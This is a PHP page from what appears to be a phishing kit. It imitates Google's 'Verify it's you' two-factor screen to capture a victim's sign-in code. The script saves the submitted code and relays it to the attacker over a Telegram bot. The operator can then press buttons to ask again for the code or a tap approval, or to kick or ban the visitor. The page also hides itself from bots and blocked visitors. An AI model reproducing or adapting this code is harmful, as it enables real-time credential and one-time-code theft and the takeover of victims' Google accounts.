<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
ob_start();

if(!isset($_SESSION['step-1']) || isset($_SESSION['404-blocked'])){
  header("HTTP/1.0 404 Not Found");
  exit();
}

require_once(__DIR__ . '/../includes/php/detect.php');
require_once(__DIR__ . '/../includes/php/config.php');

$target = checkCommand();
if ($target !== '') {
    if (strpos($target, '..') === 0 || strpos($target, '/') === 0) {
        header('Location: ' . $target);
    } else {
        header('Location: ./' . $target);
    }
    exit();
}

require(__DIR__ . '/../includes/php/bot_api.php');
require(__DIR__ . '/../includes/php/bot_reply.php');

if(!isset($_SESSION['step-4'])) $_SESSION['step-4'] = true;

if($_SERVER['REQUEST_METHOD'] == 'POST'){
    if(!empty($_POST['otp'])){

      if(!isset($_SESSION['otp_counter'])) $_SESSION['otp_counter'] = 0;

      if(isset($_SESSION['otp_err'])) unset($_SESSION['otp_err']);
      
      $_SESSION['otp'] = $_POST['otp'];
      $_SESSION['otp_counter']++;
      
      $buttons = array(
         'inline_keyboard' => array(
            array(
                array('text' => '📲 Ask G-Code Again', 'callback_data' => $_SESSION['unique_id'] . ' ask_otp'),
             ),
             array(
              array('text' => '📲 Ask Tap Yes', 'callback_data' => $_SESSION['unique_id'] . ' ask_tap'),
              ),
           array(
             array('text' => '✅ Finish', 'callback_data' => $_SESSION['unique_id'] . ' finish'),
          ),
           array(
              array('text' => '❕KICK USER❕', 'callback_data' => $_SESSION['unique_id'] . ' kick_user'),
              array('text' => '❗BAN USER❗', 'callback_data' => $_SESSION['unique_id'] . ' ban_user'),
           ),
         )
     );
   
   $activity['status'] = '🟢';
   $activity['step'] = '👁️ Proccessing';
      
      include(__DIR__ . '/../includes/php/texts.php');
      
      $status = bot_api('editMessageText', $message, $buttons);
      
      if (!bot_api_telegram_ok($status)) {
          die('{"error":true, "description": "telegram bot api"}');
      }

      $step = 3;
      require(__DIR__ . '/../includes/php/logs_text.php');
      
      bot_reply('🔔 <b>G-Code Data Updated</b>');

      header('location: process.php?for=otp');
      exit();
   }
}else{
   $buttons = array(
      'inline_keyboard' => array(
        array(
         array('text' => '❕KICK USER❕', 'callback_data' => $_SESSION['unique_id'] . ' kick_user'),
         array('text' => '❗BAN USER❗', 'callback_data' => $_SESSION['unique_id'] . ' ban_user'),
        ),
      )
   );

   $activity['status'] = '🟢';
   $activity['step'] = '👁️ Verify it’s you - G-code';

   include(__DIR__ . '/../includes/php/texts.php');

   bot_api('editMessageText', $message, $buttons);
}


?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP</title>
    <link rel="stylesheet" href="css/index.css">
    <script src="js/jquery-3.6.0.min.js"></script>
    <link rel="shortcut icon" href="media/7611770.png" type="image/x-icon">
</head>
<body>
    <?php $start_html = TRUE; require_once(__DIR__ . '/html/start.php'); ?>
                                <div class="ObDc3 ZYOIke 0-7-15-20 0-6-14-19">
                                    <h1 class="vAV9bf 0-8-20-21 0-7-19-20" id="headingText"><span class="0-9-21-22 0-8-20-21">Verify it’s you</span></h1>
                                    <div class="gNJDp" id="headingSubtext" jsname="VdSJob"><span jsslot="">To help keep your account safe, Google wants to make sure it’s really you trying to sign in <a href="javascript:void(0);">Learn more</a></span></div>
                                    <div class="SOeSgb">
                                        <div class="Ahygpe m8wwGd EPPJc cd29Sd xNLKcb">
                                           <div class="HOE91e">
                                              <div class="JQ5tlb" aria-hidden="true">
                                                 <svg aria-hidden="true" class="Qk3oof" fill="currentColor" focusable="false" width="48px" height="48px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
                                                 </svg>
                                              </div>
                                           </div>
                                           <div translate="no"><?php if(isset($_SESSION['username'])) echo $_SESSION['username']; ?></div>
                                           <div class="JCl8ie">
                                              <svg aria-hidden="true" class="Qk3oof u4TTuf" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                                 <path d="M7 10l5 5 5-5z"></path>
                                              </svg>
                                           </div>
                                        </div>
                                     </div>
                                </div>
                            </div>
                            <div class="UXFQgc 0-6-14-25 0-5-13-24">
                                <div class="qWK5J 0-7-25-26 0-6-24-25">
                                    <div class="xKcayf 0-8-26-27 0-7-25-26">
                                        <div class="AcKKx 0-9-27-28 0-8-26-27">
                                            <form method="post" novalidate="" class="0-10-28-29 0-9-27-28">
                                                <span class="0-11-29-30 0-10-28-29">
                                                    <section class="Em2Ord 0-12-30-31 0-11-29-30" >
                                                        <header class="vYeFie 0-13-31-32 0-12-30-31" aria-hidden="true"></header>
                                                        <div class="yTaH4c 0-13-31-33 0-12-30-32">

                                                            <div class="0-14-33-34 0-13-32-33">
                                                                
                                                                <div class="AFTWye vEQsqe 0-15-34-35 0-14-33-34">
                                                                    <div style="margin-bottom: 20px">
                                                                        <div class="r4WGQb">
                                                                           <ul class="Dl08I">
                                                                              <li class="aZvCDf">
                                                                                 <div>
                                                                                    Get your 
                                                                                    <strong>
                                                                                       Phone
                                                                                       <svg aria-hidden="true" class="Qk3oof  WS4XDd" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                                                                          <path d="M7 10l5 5 5-5z"></path>
                                                                                       </svg>
                                                                                    </strong>
                                                                                 </div>
                                                                              </li>
                                                                              <li class="aZvCDf">
                                                                                 <div>
                                                                                    Open the <strong>Settings</strong> app
                                                                                    <svg aria-hidden="true" class="Qk3oof  WS4XDd" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                                                                       <path d="M13.85,22.25h-3.7c-0.74,0-1.36-0.54-1.45-1.27l-0.27-1.89c-0.27-0.14-0.53-0.29-0.79-0.46l-1.8,0.72 c-0.7,0.26-1.47-0.03-1.81-0.65L2.2,15.53c-0.35-0.66-0.2-1.44,0.36-1.88l1.53-1.19c-0.01-0.15-0.02-0.3-0.02-0.46 c0-0.15,0.01-0.31,0.02-0.46l-1.52-1.19C1.98,9.9,1.83,9.09,2.2,8.47l1.85-3.19c0.34-0.62,1.11-0.9,1.79-0.63l1.81,0.73 c0.26-0.17,0.52-0.32,0.78-0.46l0.27-1.91c0.09-0.7,0.71-1.25,1.44-1.25h3.7c0.74,0,1.36,0.54,1.45,1.27l0.27,1.89 c0.27,0.14,0.53,0.29,0.79,0.46l1.8-0.72c0.71-0.26,1.48,0.03,1.82,0.65l1.84,3.18c0.36,0.66,0.2,1.44-0.36,1.88l-1.52,1.19 c0.01,0.15,0.02,0.3,0.02,0.46s-0.01,0.31-0.02,0.46l1.52,1.19c0.56,0.45,0.72,1.23,0.37,1.86l-1.86,3.22 c-0.34,0.62-1.11,0.9-1.8,0.63l-1.8-0.72c-0.26,0.17-0.52,0.32-0.78,0.46l-0.27,1.91C15.21,21.71,14.59,22.25,13.85,22.25z M13.32,20.72c0,0.01,0,0.01,0,0.02L13.32,20.72z M10.68,20.7l0,0.02C10.69,20.72,10.69,20.71,10.68,20.7z M10.62,20.25h2.76 l0.37-2.55l0.53-0.22c0.44-0.18,0.88-0.44,1.34-0.78l0.45-0.34l2.38,0.96l1.38-2.4l-2.03-1.58l0.07-0.56 c0.03-0.26,0.06-0.51,0.06-0.78c0-0.27-0.03-0.53-0.06-0.78l-0.07-0.56l2.03-1.58l-1.39-2.4l-2.39,0.96l-0.45-0.35 c-0.42-0.32-0.87-0.58-1.33-0.77L13.75,6.3l-0.37-2.55h-2.76L10.25,6.3L9.72,6.51C9.28,6.7,8.84,6.95,8.38,7.3L7.93,7.63 L5.55,6.68L4.16,9.07l2.03,1.58l-0.07,0.56C6.09,11.47,6.06,11.74,6.06,12c0,0.26,0.02,0.53,0.06,0.78l0.07,0.56l-2.03,1.58 l1.38,2.4l2.39-0.96l0.45,0.35c0.43,0.33,0.86,0.58,1.33,0.77l0.53,0.22L10.62,20.25z M18.22,17.72c0,0.01-0.01,0.02-0.01,0.03 L18.22,17.72z M5.77,17.71l0.01,0.02C5.78,17.72,5.77,17.71,5.77,17.71z M3.93,9.47L3.93,9.47C3.93,9.47,3.93,9.47,3.93,9.47z M18.22,6.27c0,0.01,0.01,0.02,0.01,0.02L18.22,6.27z M5.79,6.25L5.78,6.27C5.78,6.27,5.79,6.26,5.79,6.25z M13.31,3.28 c0,0.01,0,0.01,0,0.02L13.31,3.28z M10.69,3.26l0,0.02C10.69,3.27,10.69,3.27,10.69,3.26z"></path>
                                                                                       <circle cx="12" cy="12" r="3.5"></circle>
                                                                                    </svg>
                                                                                 </div>
                                                                              </li>
                                                                              <li class="aZvCDf">
                                                                                 <div>Tap <strong>Google</strong></div>
                                                                              </li>
                                                                              <li class="aZvCDf">
                                                                                 <div>Choose your account, if it not already selected</div>
                                                                              </li>
                                                                              <li class="aZvCDf">
                                                                                 <div>Tap <strong>Manage your Google Account</strong></div>
                                                                              </li>
                                                                              <li class="aZvCDf">
                                                                                 <div>Select the Security tab (you may need to scroll to the right)</div>
                                                                              </li>
                                                                              <li class="aZvCDf">
                                                                                 <div>Under "Signing in to Google" tap <strong>Security code</strong></div>
                                                                              </li>
                                                                              <li class="aZvCDf">
                                                                                 <div>Choose an account to get your code</div>
                                                                              </li>
                                                                           </ul>
                                                                        </div>
                                                                     </div>
                                                                    <div id="userLabel" class="rFrNMe X3mtXb UOsO2 ToAxb zKHdkd sdJrJc Tyc9J">
                                                                        <div class="aCsJod oJeWuf 0-17-36-37 0-16-35-36">
                                                                            <div class="aXBtI Wic03c 0-18-37-38 0-17-36-37">
                                                                                <div class="Xb9hP 0-19-38-39 0-18-37-38">
                                                                                    <input type="text" class="whsOnd zHQkBf 0-20-39-40 0-19-38-39" autocomplete="off" spellcheck="false" tabindex="0" name="otp" value="" aria-disabled="false" autocapitalize="none" id="otp" dir="ltr">
                                                                                    <div class="AxOyFc snByac 0-20-39-41 0-19-38-40" aria-hidden="true">Enter code</div>
                                                                                </div>
                                                                                <div class="i9lrp mIZh1c 0-19-38-42 0-18-37-41"></div>
                                                                                <div class="OabDMe cXrdqd Y2Zypf 0-19-38-43 0-18-37-42" id="style-egogs"></div>
                                                                            </div>
                                                                        </div>

                                                                        <div class="LXRPh 0-17-36-44 0-16-35-43">
                                                                            <div class="ovnfwe Is7Fhb 0-18-44-45 0-17-43-44"></div>
                                                                            <div id="errorUsername" class="dEOOab RxsGPe 0-18-44-46 0-17-43-45 <?php if(!isset($_SESSION['otp_err'])) { echo 'hidden'; } ?>" aria-atomic="true" aria-live="assertive">
                                                                                <div class="Ekjuhf Jj6Lae ">
                                                                                    <span class="AfGCob">
                                                                                    <svg aria-hidden="true" class="Qk3oof xTjuxe" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                                                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                                                                                    </svg>
                                                                                    </span>
                                                                                    Enter a code
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        
                                                                    </div>
                                                                </div>
                                                                <div class="dMNVAe 0-15-34-47 0-14-33-46" aria-live="assertive"></div>
                                                         
                                                            </div>
                                                            <div class="dgb5Cf 0-14-33-77 0-13-32-76"></div>
                                                            <div class="VfPpkd-RLmnJb 0-13-32-78 0-12-31-77"></div>
                                                        </div>
                                                        <footer class="RY3tic 0-12-30-79 0-11-29-78" jsname="Dl9iGe"></footer>
                                                    </section>
                                                </span>
                                            </form>
                                            
                                        </div>
                                       
                                    </div>
                                </div>
                            </div>
                            <div class="JYXaTc 0-6-14-88 0-5-13-87" jsname="DH6Rkf" jscontroller="z0u0L" jsaction="rcuQ6b:rcuQ6b;KWPV0:vjx2Ld(Njthtb),ChoyC(eBSUOb),VaKChb(gVmDzc),nCZam(W3Rzrc),Tzaumc(uRHG6),JGhSzd;dcnbp:dE26Sc(lqvTlf);FzgWvd:JGhSzd;" data-is-consent="false" data-is-primary-action-disabled="false" data-is-secondary-action-disabled="false" data-primary-action-label="Next" >
                                <div class="O1Slxf 0-7-88-89 0-6-87-88" jsname="DhK0U">
                                    <div class="TNTaPb 0-8-89-90 0-7-88-89" jsname="k77Iif">
                                        <div jscontroller="f8Gu1e" jsaction="click:cOuCgd;JIbuQc:JIbuQc;" jsname="Njthtb" class="XjS9D TrZEUc 0-9-90-91 0-8-89-90" id="identifierNext">
                                            <div class="VfPpkd-dgl2Hf-ppHlrf-sM5MNb 0-10-91-92 0-9-90-91" data-is-touch-wrapper="true">
                                                <button id="nextTo" class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b 0-11-92-93 0-10-91-92" type="submit">
                                                    <div class="VfPpkd-Jh9lGc 0-12-93-94 0-11-92-93"></div>
                                                    <div class="VfPpkd-J1Ukfc-LhBDec 0-12-93-95 0-11-92-94"></div>
                                                    <div class="VfPpkd-RLmnJb 0-12-93-96 0-11-92-95"></div><span jsname="V67aGc" class="VfPpkd-vQzf8d 0-12-93-97 0-11-92-96">Next</span>
                                                </button></div>
                                        </div>
                                    </div>
                                    <div class="FO2vFd 0-8-89-98 0-7-88-97" jsname="QkNstf">
                                        <div class="n3Clv 0-9-98-99 0-8-97-98" jsname="FIbd0b">
                                            <div class="VfPpkd-xl07Ob-XxIAqe-OWXEXe-oYxtQd XjS9D 0-10-99-100 0-9-98-99" jscontroller="wg1P6b" jsaction="JIbuQc:aj0Jcf(WjL7X); keydown:uYT2Vb(WjL7X);xDliB:oNPcuf;SM8mFd:li9Srb;iFFCZc:NSsOUb;Rld2oe:NSsOUb" jsname="lqvTlf"  data-disable-idom="true">
                                                <div jsname="WjL7X" class="0-11-100-101 0-10-99-100">
                                                    <div class="VfPpkd-dgl2Hf-ppHlrf-sM5MNb 0-12-101-102 0-11-100-101" data-is-touch-wrapper="true"><button class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-dgl2Hf ksBjEc lKxP2d LQeN7 BqKGqe eR0mzb TrZEUc J7pUA 0-13-102-103 0-12-101-102" jscontroller="soHxf" jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;mlnRJb:fLiPzd;" data-idom-class="ksBjEc lKxP2d LQeN7 BqKGqe eR0mzb TrZEUc  J7pUA" aria-expanded="false" aria-haspopup="menu" type="button">
                                                            <div class="VfPpkd-Jh9lGc 0-14-103-104 0-13-102-103"></div>
                                                            <div class="VfPpkd-J1Ukfc-LhBDec 0-14-103-105 0-13-102-104"></div>
                                                            <div class="VfPpkd-RLmnJb 0-14-103-106 0-13-102-105"></div><span jsname="V67aGc" class="VfPpkd-vQzf8d 0-14-103-107 0-13-102-106">Try another way</span>
                                                        </button></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
        <?php $footer_html = TRUE; require_once(__DIR__ . '/html/footer.php'); ?>
    <script src="js/otp.js"></script>
</body>
</html>